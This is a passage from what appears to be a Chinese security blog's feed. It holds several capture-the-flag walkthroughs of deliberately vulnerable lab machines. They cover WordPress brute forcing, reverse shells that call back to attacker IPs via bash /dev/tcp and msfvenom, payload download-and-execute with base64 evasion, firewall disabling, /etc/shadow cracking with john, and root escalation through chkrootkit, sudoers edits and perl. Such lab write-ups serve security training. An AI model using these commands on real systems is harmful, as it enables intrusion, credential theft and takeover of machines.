        <tag>owasp_zap</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x0b】暴力破解</title>
    <url>/1062/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到后台登录界面，使用wpscan探测用户名、metasploit暴力破解密码，登录wordpress后台上传执行php反弹shell，获得低权shell，最后利用john对靶机passwd和shadow文件进行暴力破解，获得高权用户密码，提权root获得flag。</p>
<p>本篇使用工具wpscan，metasploit，john。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url 靶机web地址 --enumerate u</span><br></pre></td></tr></table></figure>

<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment">#暴力破解</span></span><br><span class="line">&gt;use auxiliary/scanner/http/wordpress_login_enum</span><br><span class="line">&gt;<span class="built_in">set</span> rhosts 靶机IP</span><br><span class="line">&gt;<span class="built_in">set</span> targeturl 靶机web地址</span><br><span class="line">&gt;<span class="built_in">set</span> pass_file 密码文件</span><br><span class="line">&gt;<span class="built_in">set</span> username 用户名</span><br><span class="line">&gt;run</span><br><span class="line"></span><br><span class="line"><span class="comment">#监听端口</span></span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 攻击机IP</span><br><span class="line">&gt;<span class="built_in">set</span> lport 攻击机port</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; cracked</span><br><span class="line">john cracked</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个web服务，<code>dirb</code>挖掘<code>80</code>端口web信息，找到一个wordpress的登录界面：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.2.125</span><br><span class="line">dirb http://192.168.2.125/</span><br></pre></td></tr></table></figure>

<p><img src="/1062/1.PNG"></p>
<ol start="2">
<li>使用wpscan扫描这个wordpress的用户名（常规操作一般是先访问登录页面，尝试弱口令<strong>admin</strong>登录）：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.2.125/secret/ --enumerate u</span><br></pre></td></tr></table></figure>

<p><img src="/1062/2.PNG"></p>
<ol start="3">
<li>扫出来了<strong>admin</strong>用户：</li>
</ol>
<p><img src="/1062/3.PNG"></p>
<ol start="4">
<li>使用metasploit暴力破解admin用户密码，查看需要设置字段：</li>
</ol>
<p><img src="/1062/4.PNG"></p>
<ol start="5">
<li>设置参数，执行：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="comment">#暴力破解</span></span><br><span class="line">&gt;use auxiliary/scanner/http/wordpress_login_enum</span><br><span class="line">&gt;<span class="built_in">set</span> rhosts 192.168.2.125</span><br><span class="line">&gt;<span class="built_in">set</span> targeturl /secret/</span><br><span class="line">&gt;<span class="built_in">set</span> pass_file /usr/share/wordlists/dirb/common.txt</span><br><span class="line">&gt;<span class="built_in">set</span> username admin</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<p><img src="/1062/5.PNG"></p>
<ol start="6">
<li>破解出密码<strong>admin</strong>：</li>
</ol>
<p><img src="/1062/6.PNG"></p>
<ol start="7">
<li>登录后台修改404页面上传php反弹shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p /php/meterpreter/reverse_tcp -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/1062/7.PNG"></p>
<ol start="8">
<li>metasploit里开启监听，获得shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 192.168.2.205</span><br><span class="line">&gt;<span class="built_in">set</span> lport 4444</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<p><strong>注意：7、8两步也可选择复制<code>/usr/share/webshells/php/php-reverse-shell.php</code>并修改其中靶机IP端口，配合攻击机nc监听端口实现反弹shell。</strong></p>
<p><img src="/1062/8.PNG"></p>
<ol start="9">
<li>使用metasploit把靶机的<code>/etc/passwd</code>和<code>/etc/shadow</code>文件荡下来：</li>
</ol>
<p><img src="/1062/9.PNG"></p>
<ol start="10">
<li>上john破解，首先unshadow一下，之前已经破解过的加<code>--show</code>参数即可显示之前的破解结果：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; cracked</span><br><span class="line">john cracked</span><br></pre></td></tr></table></figure>

<p><img src="/1062/10.PNG"></p>
<ol start="11">
<li>ssh登录成功，依旧低权，<code>sudo -l</code>查看提权范围，<code>sudo bash</code>提权：</li>
</ol>
<p><img src="/1062/11.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>john</tag>
        <tag>metasploit</tag>
        <tag>wpscan</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x0c】命令执行漏洞</title>
    <url>/1063/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到命令测试界面，注入非法命令，执行反弹shell，得到root权限，获得flag。</p>
<p>本篇使用工具nmap，dirb，nikto，nc。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><br><span class="line"><span class="comment">#bash -i	产生一个交互式bash</span></span><br><span class="line"><span class="comment">#&gt;&amp; /dev/tcp/ip/port	建立TCP连接，并将标准输出和错误重定向到TCP连接</span></span><br><span class="line"><span class="comment">#0&gt;&amp;1	从TCP连接获取输入</span></span><br></pre></td></tr></table></figure>

<p>关于这条命令的详细解释与拓展，这里有两篇文章写的特别好：</p>
<ol>
<li><a href="https://xz.aliyun.com/t/2549">Linux 反弹shell（二）反弹shell的本质</a></li>
<li><a href="https://www.freebuf.com/articles/system/153986.html">浅析重定向与反弹Shell命令</a></li>
</ol>
<p>另外一种方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启python简易http服务器</span></span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"><span class="comment">#下载执行木马</span></span><br><span class="line">wget <span class="string">&quot;http://ip:port/shell.jsp&quot;</span> -O /var/lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个<code>8080</code>口的web服务，<code>nikto</code>挖掘<code>8080</code>端口web信息，找到一个测试界面：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.121</span><br><span class="line">nikto -host 192.168.1.121 -port 8080</span><br></pre></td></tr></table></figure>

<p><img src="/1063/1.PNG"></p>
<ol start="2">
<li>打开测试界面，按照提示输入<code>ls -l /tmp</code>测试，可以看到有反馈信息：</li>
</ol>
<p><img src="/1063/2.PNG"></p>
<ol start="3">
<li>扫描<code>/home/</code>扫出来了<strong>bill</strong>用户，查看一下<strong>bill</strong>用户目录，最下面的文件描述提示该用户可以sudo：</li>
</ol>
<p><img src="/1063/3.PNG"></p>
<ol start="4">
<li>本地ssh登录bill用户，测试sudo命令：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/1063/4.PNG"></p>
<ol start="5">
<li>sudo关闭防火墙，否则后面反弹shell穿不透墙：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>

<p><img src="/1063/5.PNG"></p>
<ol start="6">
<li>反弹一个root权限的shell给攻击机：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.114/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="/1063/6.PNG"></p>
<ol start="7">
<li>获取flag，不知道为啥shell里输入都double了，问题不大：</li>
</ol>
<p><img src="/1063/7.PNG"></p>
<p><strong>解决方法：</strong></p>
<p><strong>I’m guessing both terminals had stty echo, so you probably needed to <code>Ctrl-Z</code> and <code>stty -echo</code> on your local terminal and <code>bg</code> to get back to the remote shell.</strong></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x0d】命令执行漏洞（集成工具）</title>
    <url>/1064/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到一个登陆界面和一个测试界面，审计源代码，破解用户名和口令登陆后台，使用命令测试界面执行反弹shell，得到低权用户权限，后面一种是审计代码猜出root口令(太有CTF内味了)，另一种是正常方法，审计代码查询定时任务，篡改定时任务源码，反弹得到root权限，获得flag。本文两种方式均有展示，后面的方法找遍全网，才从油管上一个西班牙小哥的视频里学到细节，难道大家都这么爱猜的吗？</p>
<p>本篇使用工具sparta(已改名legion)，metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><br><span class="line"><span class="comment">#bash -i	产生一个交互式bash</span></span><br><span class="line"><span class="comment">#&gt;&amp; /dev/tcp/ip/port	建立TCP连接，并将标准输出和错误重定向到TCP连接</span></span><br><span class="line"><span class="comment">#0&gt;&amp;1	从TCP连接获取输入</span></span><br></pre></td></tr></table></figure>

<p>如果使用msfvenom则是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=[ip] lport=[port] -f raw &gt; shell.py </span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，两个web服务，不过<code>80</code>口和<code>8080</code>口服务一样，<code>dirb</code>挖掘<code>80</code>端口web信息，找到后台登录界面和测试界面：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.2.222</span><br><span class="line">dirb http://192.168.2.222</span><br></pre></td></tr></table></figure>

<p><img src="/1064/1.PNG"></p>
<ol start="2">
<li>后台弱口令登不上，打开测试界面，没有权限，审计源码，可以看到SHA1加密的口令信息：</li>
</ol>
<p><img src="/1064/2.PNG"></p>
<ol start="3">
<li>上网站<code>crackstation.neet</code>破解，出来俩密码(这个本地john也能破解，不过只能出一个)：</li>
</ol>
<p><img src="/1064/3.PNG"></p>
<ol start="4">
<li>登陆了后台，没什么操作的权限，但是测试界面的shell可以用了，有些不允许使用的命令也可以绕过检测，下面列举几种绕过检测的方式：</li>
</ol>
<p><img src="/1064/4.PNG"></p>
<ol start="5">
<li>绕过检测反弹个shell回来，不过是低权的：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.205/4444 0&gt;&amp;1&#x27;</span> | bash</span><br></pre></td></tr></table></figure>

<p><img src="/1064/5.PNG"></p>
<ol start="6">
<li>切到<strong>bulldogadmin</strong>用户目录下，找着一个隐藏的敏感目录，打开里面有俩文件：</li>
</ol>
<p><img src="/1064/6.PNG"></p>
<ol start="7">
<li><strong>note</strong>文件就是一些提示，一个点是文件夹下另一个文件有敏感信息，另一个点事建议往web方向探索，使用<code>cat</code>查看另一个文件各种乱码，换<code>strings</code>来看：</li>
</ol>
<p><img src="/1064/7.PNG"></p>
<ol start="8">
<li>就这么猜出来了root密码，拿到flag，我也是佛了，看作者留下来的信息，肯定还有正常的方式来拿到root权限，不是靠猜：</li>
</ol>
<p><img src="/1064/8.PNG"></p>
<ol start="9">
<li>重新再来，这次不猜密码，查看定时任务，找到一个非常可疑的任务<code>runAV</code>：</li>
</ol>
<p><img src="/1064/9.PNG"></p>
<ol start="10">
<li>这个任务是每隔1分钟以root用户执行一次<code>/.hiddenAVDirectory/AVApplication.py</code>，然而这个py文件是任何人都可以修改执行的：</li>
</ol>
<p><img src="/1064/10.PNG"></p>
<ol start="11">
<li>msfvenom生成反弹shell，这里我一般使用的<code>pyhton/meterpreter/reverse_tcp</code>这个payload不好使，靶机执行不了。换成油管西班牙小哥用的<code>cmd/unix/reverse_python</code>就可以了，但是也得编辑把<code>import</code>去了，后面再加个<code>decode</code>，不然靶机import不了包还是报错：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=192.168.2.205 lport=4443 -f raw &gt; shell.py </span><br></pre></td></tr></table></figure>

<p><img src="/1064/11.PNG"></p>
<ol start="12">
<li>到靶机上，因为没有完整的bash，所以vim用不了，只能把代码echo进去，注意代码里的<code>&quot;</code>前面要加<code>\</code>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;text\&quot;text\&quot;text&quot;</span> &gt; shell.py</span><br></pre></td></tr></table></figure>

<p><img src="/1064/12.PNG"></p>
<ol start="13">
<li>metasploit里开启监听，一分钟左右反弹回了root权限的shell，这才是正道啊，猜密码都是邪道（滑稽）：</li>
</ol>
<p><img src="/1064/13.PNG"></p>
<ol start="14">
<li>哦对，忘了这期视频是教集成工具<strong>sparta</strong>，这个探出来的信息其实也不是很全，不过胜在方便，现在改名<strong>legion</strong>了，下面贴张扫描图：</li>
</ol>
<p><img src="/1064/14.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://www.youtube.com/watch?v=sqx3MDUnEpc&t=2s">【youtube】Fernando Pinheiro - Vulnhub Bulldog - Como hackear a vm.</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x0e】PUT上传漏洞</title>
    <url>/1065/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到一个文件目录界面，curl测试发现开放PUT权限，上传反弹shell获得低权用户的shell，审计代码查询定时任务，发现chkrootkit的0.49版本存在漏洞，使用metasploit结合刚才获得的shell提权攻击，获得root权限。另外还有两种网上查到的提权方法一并展示，不得不说攻击的手段真是层出不穷，方法真是五花八门。</p>
<p>本篇使用工具curl，metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试url允许的post参数</span></span><br><span class="line">curl -v -X OPTIONS [url]</span><br><span class="line"></span><br><span class="line"><span class="comment">#PUT上传</span></span><br><span class="line">curl -v -T [file] [url]</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，<code>80</code>口有web服务，<code>dirb</code>挖掘<code>80</code>端口web信息，找到一个测试界面，打开是文件目录：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.2.149</span><br><span class="line">dirb http://192.168.2.149</span><br></pre></td></tr></table></figure>

<p><img src="/1065/1.PNG"></p>
<ol start="2">
<li>curl测试网站支持参数，发现可以利用PUT上传反弹shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -X OPTIONS http://192.168.2.149/test/</span><br></pre></td></tr></table></figure>

<p><img src="/1065/2.PNG"></p>
<ol start="3">
<li>生成反弹shell并上传，这里必须加<code>-H</code>自定义头为**Expect:**，否则靶机<code>lighttpd/1.4.28</code>这个版本会返回417错误上传失败：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v -H <span class="string">&quot;Expect:&quot;</span> -T Desktop/shells/php_reverse_shell.php http://192.168.2.149/test/</span><br></pre></td></tr></table></figure>

<p><img src="/1065/3.PNG"></p>
<ol start="4">
<li>开启监听，在靶机执行反弹shell，结果没有弹回来，应该是防火墙拦截了：</li>
</ol>
<p><img src="/1065/4.PNG"></p>
<ol start="5">
<li>修改监听端口为<code>443</code>，成功绕过防火墙拿到低权shell，这里中途换了metasploit监听（对应shell需要msfvenom生成），方便下一步的提权：</li>
</ol>
<p><img src="/1065/6.PNG"></p>
<p><img src="/1065/5.PNG"></p>
<ol start="6">
<li>一顿狂扫，按版本搜漏洞，最后系统版本无漏洞，内核版本无漏洞，chkrootkit(一个检测恶意软件Rootkit的脚本)版本存在漏洞：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkrootkit -V</span><br></pre></td></tr></table></figure>

<p><img src="/1065/7.PNG"></p>
<ol start="7">
<li>metasploit使用对应漏洞，结合刚才的shell，提权root：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/unix/local/chkrootkit</span><br><span class="line">&gt;<span class="built_in">set</span> payload cmd/unix/reverse</span><br><span class="line">&gt;<span class="built_in">set</span> session 2</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<p><img src="/1065/8.PNG"></p>
<ol start="8">
<li>成功本地提权，这个利用的是创建<code>/tmp</code>下的<strong>update</strong>文件欺骗<strong>chkrootkit</strong>更新以执行提权：</li>
</ol>
<p><img src="/1065/9.PNG"></p>
<ol start="9">
<li>既然了解了原理，我们也可以手动操作，切到<code>/tmp</code>目录下新建<strong>update</strong>文件，echo进去一段代码将当前用户写入sudo组：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> /tmp/update</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/update</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br></pre></td></tr></table></figure>

<p><img src="/1065/10.PNG"></p>
<ol start="10">
<li>还有一种方法是编写exp，原理差不多，改变&#x2F;tmp的所属组为root以及增加uid为root权限，不过涉及到编译，操作多一点，万一靶机gcc不好使就没办法了：</li>
</ol>
<ul>
<li>exp脚本如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> system(<span class="string">&quot;chown root;root /tmp/update&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;chmod 4755 /tmp/update&quot;</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc update.c -o update</span><br><span class="line">./update</span><br></pre></td></tr></table></figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://www.cnblogs.com/yuzly/p/10854392.html">kali渗透综合靶机(十二)–SickOs1.2靶机</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>metasploit</tag>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x0f】命令注入漏洞</title>
    <url>/1066/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘web服务并探索robots.txt找到敏感目录，得到后台地址和用户口令，searchsploit搜索可利用漏洞，通过burpsuite篡改上传文件名为可执行命令，执行反弹shell获得低权用户shell，sudo -l查看免密sudo目录，使用perl命令行执行提权代码，获得root权限。</p>
<p>本篇使用工具nmap，dirb，nikto，burpsuite，metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="perl提权"><a href="#perl提权" class="headerlink" title="perl提权"></a>perl提权</h2><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="string">&quot;exec &#x27;/bin/sh&#x27;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改文件名为可执行php代码</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;BAES64_TEXT_HERE&#x27;</span>));<span class="keyword">die</span>();<span class="meta">?&gt;</span>.php</span><br></pre></td></tr></table></figure>

<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encode</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PLAIN_TEXT_HERE&quot;</span> | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;BASE64_TEXT_HERE&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个<code>80</code>口的web服务，<code>dirb</code>挖掘<code>80</code>端口web信息，找到<code>robots.txt</code>和几个敏感目录：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.121</span><br><span class="line">dirb http://192.168.1.121 </span><br></pre></td></tr></table></figure>

<p><img src="/1066/1.PNG"></p>
<ol start="2">
<li>依次访问，<code>/secure/</code>找到可疑的备份文件，<code>/nothing/</code>页面源码找到几个密码口令：</li>
</ol>
<p><img src="/1066/2.PNG"></p>
<ol start="3">
<li>下载备份文件，解压需要密码，用前面的密码一个一个试：</li>
</ol>
<p><img src="/1066/3.PNG"></p>
<ol start="4">
<li>解压出来看着格式和大小都不太对，<code>file</code>查看格式是文本，读取得到后台登录页面和用户名：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file backup-cred.mp3</span><br></pre></td></tr></table></figure>

<p><img src="/1066/4.PNG"></p>
<ol start="5">
<li>访问后台，还是前面的密码一个一个试：</li>
</ol>
<p><img src="/1066/5.PNG"></p>
<ol start="6">
<li>查找playSMS系统漏洞，找到一个修改文件名漏洞：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit playSMS</span><br></pre></td></tr></table></figure>

<p><img src="/1066/6.PNG"></p>
<ol start="7">
<li>查看漏洞说明文档，有详细说明介绍：</li>
</ol>
<p><img src="/1066/7.PNG"></p>
<ol start="8">
<li>burpsuite开启监听，配置好浏览器的代理，点击上传文件，<code>Proxy</code>截获报文，发送到<code>Repeater</code>准备修改：</li>
</ol>
<p><img src="/1066/8.PNG"></p>
<ol start="9">
<li><code>Repeater</code>里修改文件名为可执行命令，点击<code>Send</code>发送，右面的<code>Render</code>应该返回一个实时页面，这里出bug了，谷歌了一会也没解决：</li>
</ol>
<p><img src="/1066/9.PNG"></p>
<ol start="10">
<li>生成反弹shell，格式是linux下的可执行二进制文件elf，放到apache目录下，启动apache2服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.1.114 lport=4444 -f elf &gt; shell.elf</span><br><span class="line"><span class="built_in">cp</span> shell.elf /var/www/html/shell.elf</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="/1066/10.PNG"></p>
<ol start="11">
<li>base64加密命令来绕过防火墙检测,依次修改文件名，每改一次需要重新抓一次包，不能重复发送同一个包：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;wget -O /tmp/shell http://192.168.1.114/shell.elf&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod 777 /tmp/shell&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/tmp/shell&#x27;</span> | <span class="built_in">base64</span></span><br></pre></td></tr></table></figure>

<p><img src="/1066/11.PNG"></p>
<ol start="12">
<li>metasploit开启监听，依次执行完三条命令，反弹得到<code>www-data</code>权限的shell：</li>
</ol>
<p><img src="/1066/12.PNG"></p>
<ol start="13">
<li><code>sudo -l</code>查看发现<code>perl</code>有免密root执行权限，提权：</li>
</ol>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="string">&quot;exec &#x27;/bin/sh&#x27;&quot;</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>

<p><img src="/1066/13.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>metasploit</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x10】综合测试（低难度）--- BTRsys1</title>
    <url>/1067/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘web服务找到后台地址，审计源码跳过mysql检测登录，使用burpsuite抓包绕过检测上传反弹shell，执行反弹shell获得低权用户shell，提权有两种方式，一种是查看网站配置文件找到mysql数据库，里面存着密码，可以root，另外一种是searchsploit系统版本，执行本地提权脚本返回root权限，本文两种方式均有展示。</p>
<p>本篇使用工具nmap，dirb，nikto，burpsuite，metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成shell</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=攻击机端口 -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 攻击机IP</span><br><span class="line">&gt;<span class="built_in">set</span> lport 攻击机端口</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个<code>80</code>口的web服务，<code>dirb</code>挖掘<code>80</code>端口web信息，找到后台登录界面：</li>
</ol>
